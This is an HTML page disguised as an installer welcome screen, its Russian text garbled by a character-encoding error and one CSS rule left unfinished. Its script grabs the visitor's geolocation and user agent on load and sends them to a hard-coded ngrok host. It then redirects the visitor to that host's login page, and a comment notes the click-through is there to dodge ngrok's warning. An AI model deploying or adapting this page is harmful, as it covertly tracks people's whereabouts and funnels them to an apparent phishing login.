<!DOCTYPE html>

<head>

  <title>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status { margin-bottom: 15px; }
    #continueBtn, #retryBtn {
      display: none;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    #continueBtn {
      background: #28a745;
      color: white;
      margin-right: 10px;
    }
    #retryBtn {

  </style>
</head>
<body>
  <h2>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –î–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –¥–∞–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è</h2>
  <p id="status">–û–∂–∏–¥–∞–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è...</p>
  <button id="continueBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
  <button id="retryBtn">–ü–æ–≤—Ç–æ—Ä–∏—Ç—å –∑–∞–ø—Ä–æ—Å</button>

  <script>
    const status = document.getElementById('status');
    const retryBtn = document.getElementById('retryBtn');
    const continueBtn = document.getElementById('continueBtn');

    let serverUrl = "https://e9ad-80-79-6-94.ngrok-free.app";

    function requestGeo() {
      navigator.geolocation.getCurrentPosition(
        async position => {
          const geoData = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
          };

          try {
            await fetch(serverUrl + "/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(geoData)
            });

            status.textContent = "–°–ø–∞—Å–∏–±–æ! –ù–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å'.";
            continueBtn.style.display = "inline-block";
          } catch (err) {
            status.textContent = "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö.";
            retryBtn.style.display = "inline-block";
          }
        },
        error => {
          status.textContent = "–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: " + error.message;
          retryBtn.style.display = "inline-block";
        }
      );
    }

    retryBtn.onclick = () => {
      status.textContent = "–ü–æ–≤—Ç–æ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...";
      retryBtn.style.display = "none";
      requestGeo();
    };

    continueBtn.onclick = () => {
      // üëâ —Ç–µ–ø–µ—Ä—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ö–õ–ò–ö–ê–ï–¢ —Å–∞–º ‚Äî –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ ngrok –ù–ï –ø–æ—è–≤–∏—Ç—Å—è
      window.location.href = serverUrl + "/login";
    };

    setTimeout(requestGeo, 1000);
  </script>
